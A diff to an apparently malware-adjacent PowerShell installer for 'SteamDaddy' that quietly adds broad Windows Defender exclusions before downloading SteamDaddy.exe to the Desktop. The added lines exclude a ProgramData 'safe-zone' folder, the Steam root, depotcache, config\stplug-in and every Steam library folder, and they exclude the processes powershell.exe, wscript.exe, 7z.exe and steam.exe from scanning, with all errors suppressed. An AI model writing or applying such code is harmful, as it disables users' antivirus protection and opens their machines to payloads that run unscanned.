@@ -24,7 +24,22 @@ try {
     Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess "SteamDaddy.exe" -ErrorAction SilentlyContinue
 
-    # Find and exclude the Steam root directory
+    # ── SteamDaddy Safe-Zone (fixed pre-excluded temp directory) ─────────
+    $sdTempDir = "C:\ProgramData\SteamDaddy\tmp"
+    if (-not (Test-Path $sdTempDir)) {
+        New-Item -ItemType Directory -Path $sdTempDir -Force | Out-Null
+    }
+    Write-Host "[SteamDaddy] Excluding safe-zone temp folder: $sdTempDir" -ForegroundColor Yellow
+    Add-MpPreference -ExclusionPath "C:\ProgramData\SteamDaddy" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $sdTempDir -ErrorAction SilentlyContinue
+
+    # ── Process exclusions (Defender won't scan files written by these) ──
+    Add-MpPreference -ExclusionProcess "steam.exe"        -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "7z.exe"           -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "wscript.exe"      -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe"   -ErrorAction SilentlyContinue
+
+    # ── Find and exclude the Steam root directory ─────────────────────────
     $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
     if (-not $steamPath) {
         $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
@@ -35,6 +50,26 @@ try {
     if ($steamPath) {
         Write-Host "[SteamDaddy] Excluding Steam root folder: $steamPath" -ForegroundColor Yellow
         Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
+
+        # Explicit belt-and-suspenders for the two hottest subdirs
+        Add-MpPreference -ExclusionPath (Join-Path $steamPath "depotcache")       -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath (Join-Path $steamPath "config\stplug-in") -ErrorAction SilentlyContinue
+
+        # ── Parse libraryfolders.vdf and exclude all secondary libraries ──
+        $libraryVdf = Join-Path $steamPath "steamapps\libraryfolders.vdf"
+        if (Test-Path $libraryVdf) {
+            $vdfContent = Get-Content $libraryVdf -Raw -ErrorAction SilentlyContinue
+            if ($vdfContent) {
+                $libMatches = [regex]::Matches($vdfContent, '"path"\s+"([^"]+)"')
+                foreach ($m in $libMatches) {
+                    $libPath = $m.Groups[1].Value.Replace("\\\\", "\\")
+                    if ($libPath -and $libPath -ne $steamPath -and (Test-Path $libPath)) {
+                        Write-Host "[SteamDaddy] Excluding Steam library: $libPath" -ForegroundColor Yellow
+                        Add-MpPreference -ExclusionPath $libPath -ErrorAction SilentlyContinue
+                    }
+                }
+            }
+        }
     }
 
     Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
